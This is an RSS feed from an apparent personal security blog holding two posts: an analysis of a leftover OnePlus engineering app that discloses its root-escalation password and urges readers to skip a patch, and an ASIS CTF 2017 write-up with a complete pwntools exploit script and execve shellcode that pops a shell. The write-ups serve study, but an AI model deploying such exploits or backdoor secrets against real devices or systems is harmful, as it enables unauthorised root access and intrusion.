<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>z3r0s</title>
    <description></description>
    <link>http://z3r0s.github.io/</link>
    <atom:link href="http://z3r0s.github.io/feed.xml" rel="self" type="application/rss+xml" />
    
      <item>
        <title>One Plus - Engineer Mode</title>
        <description>&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:
This is a recap of engineer mode app found by &lt;a href=&quot;https://github.com/fa0c131y&quot; class=&quot;user-mention&quot;&gt;@fa0c131y&lt;/a&gt; (Elliot Alderson) on One Plus.&lt;/p&gt;

&lt;h2 id=&quot;issue&quot;&gt;Issue&lt;/h2&gt;

&lt;p&gt;The manufacturer of One Plus accidentally left out an apk that is used to test the device. As it is a system app, it has many capabilities that the normal user should not have an access to.&lt;/p&gt;

&lt;h2 id=&quot;features&quot;&gt;Features&lt;/h2&gt;
&lt;p&gt;There are so many as it is an app made for testing the various features on the device but I will go through a few features that got the most attention.&lt;/p&gt;

&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;

&lt;p&gt;This is perhaps the feature that got the most attention from the normal user as it allows to gain a root privilege on the device by sending an intent with a correct secret code.&lt;/p&gt;

&lt;p&gt;There are two methods that handle privilege escalation process:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;escalateUp&lt;/li&gt;
  &lt;li&gt;Privilege.escalate&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;escalateup&quot;&gt;escalateUp&lt;/h3&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;private boolean escalatedUp(boolean enable, String password) {
        boolean ret = true;
        if (enable) {
            if (password != null) {
                enable = Privilege.escalate(password);
                if (enable) {
                    SystemProperties.set(&amp;quot;persist.sys.adbroot&amp;quot;, &amp;quot;1&amp;quot;);
                    SystemProperties.set(&amp;quot;oem.selinux.reload_policy&amp;quot;, &amp;quot;1&amp;quot;);
                }
                Log.d(&amp;quot;DiagEnabled&amp;quot;, &amp;quot;privilege escalate &amp;quot; + (enable ? &amp;quot;success&amp;quot; : &amp;quot;failed&amp;quot;));
            } else {
                enable = false;
            }
            ret = enable;
        } else {
            SystemProperties.set(&amp;quot;persist.sys.adbroot&amp;quot;, &amp;quot;0&amp;quot;);
            Privilege.recover();
        }
        Editor e = getSharedPreferences(&amp;quot;privilege&amp;quot;, 0).edit();
        e.putBoolean(&amp;quot;escalated&amp;quot;, enable);
        e.commit();
        updatePrivilegeButton();
        if (ret) {
            if (&amp;quot;0&amp;quot;.equals(SystemProperties.get(&amp;quot;persist.sys.adbroot&amp;quot;, &amp;quot;1&amp;quot;))) {
                new Thread(new Runnable() {
                    public void run() {
                        Log.i(&amp;quot;DiagEnabled&amp;quot;, &amp;quot;reboot device...&amp;quot;);
                        ((PowerManager) DiagEnabled.this.getSystemService(&amp;quot;power&amp;quot;)).reboot(null);
                    }
                }).start();
            } else {
                SystemProperties.set(&amp;quot;ctl.restart&amp;quot;, &amp;quot;adbd&amp;quot;);
            }
        }
        return ret;
    }&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This method checks the given password (if it is not null) by calling &lt;strong&gt;Privilege.escalate(password)&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;If the password is correct, the ‘enabled’ value should be non-zero and system properties &lt;strong&gt;persist.sys.adbroot&lt;/strong&gt; and &lt;strong&gt;oem.selinux.reaload_policy&lt;/strong&gt; get set.&lt;/p&gt;

&lt;h3 id=&quot;privilege-class&quot;&gt;Privilege class&lt;/h3&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;package com.android.engineeringmode.qualcomm;

public class Privilege {
    public static native boolean escalate(String str);

    public static native boolean isEscalated();

    public static native void recover();

    static {
        System.loadLibrary(&amp;quot;door&amp;quot;);
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This method is implemented on the native side and as expected the result returns a boolean value. This is effectively a flag that determines if the password was correct or not.&lt;/p&gt;

&lt;p&gt;Unfortunatley, I was not able to get the copy of actual library (door) as I do not own any One Plus device. But, looking at the photos posted on twitter, it seems that this method simply compares sha256 hash.&lt;/p&gt;

&lt;p&gt;In case of anyone who wants to know the secret code, it’s &lt;strong&gt;angela&lt;/strong&gt;. For more details on the native side, just check out his twitter.&lt;/p&gt;

&lt;p&gt;Note - There is an interesting method in &lt;strong&gt;CheckRootStatusActivity&lt;/strong&gt; class:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;private boolean checkAngelaRoot() {
	boolean isAngelaRoot = SystemProperties.get(&amp;quot;persist.sys.adbroot&amp;quot;, &amp;quot;&amp;quot;).equals(&amp;quot;1&amp;quot;);
	Log.i(&amp;quot;CheckRootStatusActivity&amp;quot;, &amp;quot;my device has been angela root  :&amp;quot; + isAngelaRoot);
	return isAngelaRoot;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Doesn’t the method name sound familar?&lt;/p&gt;

&lt;h3 id=&quot;unlock&quot;&gt;Unlock&lt;/h3&gt;

&lt;p&gt;This is another (at least my opinion) interesting feature because the user can (supposedly) unlock the device without contacting the provider.&lt;/p&gt;

&lt;p&gt;There are three classes that are involved in locking and unlocking the deivce:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ClearTelcelnetlock&lt;/li&gt;
  &lt;li&gt;RecoverTelcelnetlock&lt;/li&gt;
  &lt;li&gt;Telcelnetlock&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;cleartelcelnetlock&quot;&gt;ClearTelcelnetlock&lt;/h3&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e(&amp;quot;ClearTelcelnetlock&amp;quot;, &amp;quot;onCreat!&amp;quot;);
        if (SystemProperties.get(&amp;quot;ro.oppo.build.exp&amp;quot;, &amp;quot;US&amp;quot;).equalsIgnoreCase(&amp;quot;MX&amp;quot;)) {
            this.tm = (TelephonyManager) getSystemService(&amp;quot;phone&amp;quot;);
            mIMEI = this.tm.getDeviceId();
            this.unlocktimes = Telcelnetlock.getUnlockTimes();
            if (this.unlocktimes &amp;lt; 0) {
                Log.e(&amp;quot;ClearTelcelnetlock&amp;quot;, &amp;quot;get unlocktimes failed!&amp;quot;);
                doFinish();
                return;
            } else if (this.unlocktimes &amp;gt;= 5) {
                Toast.makeText(this, 2131297350, 0).show();
                SystemProperties.set(&amp;quot;PROPERTY_LOCKFOREVER&amp;quot;, &amp;quot;true&amp;quot;);
                SendLockForeverBroadcasttoUI();
                Log.e(&amp;quot;ClearTelcelnetlock&amp;quot;, &amp;quot;get unlocktimes &amp;gt; 5, send lockforever broadcase to ui to lock device immediately!&amp;quot;);
                doFinish();
                return;
            } else {
                if (checkTelcelNetlock()) {
                    showTelcelNetLockClearDialog(this);
                } else {
                    showTelcelNetLockRecoverDialog(this);
                }
                return;
            }
        }
        Log.e(&amp;quot;ClearTelcelnetlock&amp;quot;, &amp;quot;Not MX build, Just exit!&amp;quot;);
        doFinish();
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As the name suggested, this class is resposnbile for clearing the lock on the device. It locks the device (if the device is unlocked) by default when this class gets instantiated.&lt;/p&gt;

&lt;h3 id=&quot;recovertelcelnetlock&quot;&gt;RecoverTelcelnetlock&lt;/h3&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;protected void onCreate(Bundle savedInstanceState) {
	super.onCreate(savedInstanceState);
	Log.e(&amp;quot;RecoverTelcelnetlock&amp;quot;, &amp;quot;onCreat!&amp;quot;);
	if (!SystemProperties.get(&amp;quot;ro.oppo.build.exp&amp;quot;, &amp;quot;US&amp;quot;).equalsIgnoreCase(&amp;quot;MX&amp;quot;)) {
		Log.e(&amp;quot;RecoverTelcelnetlock&amp;quot;, &amp;quot;Not MX build, Just exit!&amp;quot;);
		doFinish();
	} else if (checkTelcelNetlock()) {
		Toast.makeText(this, &amp;quot;Device is alread locked!&amp;quot;, 0).show();
		doFinish();
	} else {
		showTelcelNetLockRecoverDialog(this);
	}
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As the name suggested, this class is responsible for recovering AP telcelnetlock and modem telcelnetlock.&lt;/p&gt;

&lt;h3 id=&quot;telcelnetlock&quot;&gt;Telcelnetlock&lt;/h3&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;package com.android.engineeringmode.qualcomm;

public class Telcelnetlock {
    public static native boolean addUnlockTimes();

    public static native int check();

    public static native boolean clear();

    public static native int getUnlockTimes();

    public static native boolean match(String str, String str2);

    public static native boolean recover();

    static {
        System.loadLibrary(&amp;quot;telcelnetlock&amp;quot;);
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This is a class that loads the native library, which contains the code for list of methods above. I would love to see the decompiled or even disassembled output of clear method as it seems to be responsible for unlocking the device. If anyone actually owns One Plus device and have looked into this app, let me know.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;There are way more interesting features to look into but I have picked two that probably most of the users in android scene would care about. At the end of the day, it was lost for One Plus and win for the users who wanted to root their device. Everyone can now have a root privilege (on One Plus device or any device that was tested to have this app installed) without unlocking the bootloader, which is great as the users do not have to think about bypassing SafetyNet check.&lt;/p&gt;

&lt;p&gt;As far as I am aware, One Plus pushed the update in order to remove engineer mode app. So do not update the device if you still want to have a root privilege. If you still have this app in your hand, you can update the device and still have a root by installing the app manually.&lt;/p&gt;

</description>
        <pubDate>Tue, 19 Dec 2017 16:00:00 -0800</pubDate>
        <link>http://z3r0s.github.io/2017/12/19/one-plus-engineer-mode/</link>
        <guid isPermaLink="true">http://z3r0s.github.io/2017/12/19/one-plus-engineer-mode/</guid>
      </item>
    
      <item>
        <title>ASIS-CTF-2017-FINAL-Mrs.Hudson</title>
        <description>&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:
England would fall if Mrs. Hudson leaves Baker Street. Mrs. Hudson is the first one who is totally exploited by Sherlock, or Does She?&lt;/p&gt;

&lt;h2 id=&quot;file&quot;&gt;File&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;
~/Desktop                                                         
▶ file hudson
hudson: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a99b54f5a0f90ebade826e34188ac1f5eebb2cc7, not stripped
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The given binary was not stripped, which often implies either the challenge is extremely difficult or simple.&lt;/p&gt;

&lt;h2 id=&quot;protections&quot;&gt;Protections&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;
~/Desktop 
▶ checksec --file hudson
[*] &#39;/home/zero/Desktop/hudson&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;No protections were enabled, which made it eaiser for me to solve.&lt;/p&gt;

&lt;h2 id=&quot;program&quot;&gt;Program&lt;/h2&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;000000000040061a &amp;lt;main&amp;gt;:
  40061a:       55                      push   %rbp
  40061b:       48 89 e5                mov    %rsp,%rbp
  40061e:       48 83 c4 80             add    $0xffffffffffffff80,%rsp
  400622:       89 7d 8c                mov    %edi,-0x74(%rbp)
  400625:       48 89 75 80             mov    %rsi,-0x80(%rbp)
  400629:       48 8b 05 20 0a 20 00    mov    0x200a20(%rip),%rax        # 601050 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;
  400630:       b9 00 00 00 00          mov    $0x0,%ecx
  400635:       ba 02 00 00 00          mov    $0x2,%edx
  40063a:       be 00 00 00 00          mov    $0x0,%esi
  40063f:       48 89 c7                mov    %rax,%rdi
  400642:       e8 c9 fe ff ff          callq  400510 &amp;lt;setvbuf@plt&amp;gt;
  400647:       48 8b 05 f2 09 20 00    mov    0x2009f2(%rip),%rax        # 601040 &amp;lt;__TMC_END__&amp;gt;
  40064e:       b9 00 00 00 00          mov    $0x0,%ecx
  400653:       ba 02 00 00 00          mov    $0x2,%edx
  400658:       be 00 00 00 00          mov    $0x0,%esi
  40065d:       48 89 c7                mov    %rax,%rdi
  400660:       e8 ab fe ff ff          callq  400510 &amp;lt;setvbuf@plt&amp;gt;
  400665:       bf 14 07 40 00          mov    $0x400714,%edi
  40066a:       e8 91 fe ff ff          callq  400500 &amp;lt;puts@plt&amp;gt;
  40066f:       48 8d 45 90             lea    -0x70(%rbp),%rax
  400673:       48 89 c6                mov    %rax,%rsi
  400676:       bf 2b 07 40 00          mov    $0x40072b,%edi
  40067b:       b8 00 00 00 00          mov    $0x0,%eax
  400680:       e8 9b fe ff ff          callq  400520 &amp;lt;__isoc99_scanf@plt&amp;gt;
  400685:       c9                      leaveq 
  400686:       c3                      retq&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The program was very small enough that I used objdump instead of IDA to see what the program does. It simply prints a text and waits for the user input using scanf.&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;
~/Desktop                                                         
▶ ./hudson
Let&#39;s go back to 2000.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    87899 segmentation fault (core dumped)  ./hudson
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;As a first step, I ran the program.  I gave in a large number of ‘a’ to see if it would crash the program and it did.&lt;/p&gt;

&lt;p&gt;It turned out to be a simple stack overflow. Since there were no protections, I was immediately thinking of redirecting rip to the address of buffer that has my shellcode. But, the issue with this method was that I have no way of knowing the address of buffer without some form of leak.&lt;/p&gt;

&lt;p&gt;Thus, I either had to use rop or store the shellcode in static address that would not get affected by aslr. I went with the second method since the organizer did not provide libc for this problem.&lt;/p&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;p&gt;As the output of the program suggested, I pivoted a stack to bss and read in the shellcode near bss. This was done so that it executes my shellcode when the program returns from the fake stack.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;from pwn import *
import sys

context.log_level=True

local = 1

libc = ELF(&amp;quot;/lib/x86_64-linux-gnu/libc-2.23.so&amp;quot;)

if local:
        r = remote(&amp;quot;localhost&amp;quot;,5555)
        pause()
else:
        r = remote(&amp;quot;178.62.249.106&amp;quot;,8642)
        pause()


puts = p64(0x000000000040066a)
prdi = p64(0x004006f3)
main = p64(0x000000000040066f)
prsi = p64(0x004006f1)
prbp = p64(0x00400575)
leave = p64(0x0000000000400685)

payload = &amp;quot;A&amp;quot;*120
payload += prsi #pop rsi ; pop r15 ; ret  ;  (1 found)
payload += p64(0x601081) #bss
payload += p64(0x41) #junk
payload += prbp #pop rbp ; ret  ;  (1 found)   
payload += p64(0x000000000601079) #stack pivot
payload += p64(0x0000000000400676) #scanf
payload += p64(0x0000000000601050) #near bss (calculated)

s =&amp;quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&amp;quot;

r.recvuntil(&amp;quot;.&amp;quot;)
r.sendline(payload)

r.sendline(p64(0x000000000601089)+s) #read in shellcode 

r.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The result of running the exploit&lt;/p&gt;

&lt;p&gt;&lt;code&gt;
~/Desktop                                                                                                                           
▶ python hudson.py
[*] &#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to localhost on port 5555: Done
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1000(zero) gid=1000(zero) groups=1000(zero),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ exit
[*] Got EOF while reading in interactive
&lt;/code&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 13 Sep 2017 17:00:00 -0700</pubDate>
        <link>http://z3r0s.github.io/2017/09/13/asis-ctf-2017-final-mrs-hudson/</link>
        <guid isPermaLink="true">http://z3r0s.github.io/2017/09/13/asis-ctf-2017-final-mrs-hudson/</guid>
      </item>
    
  </channel>
</rss>
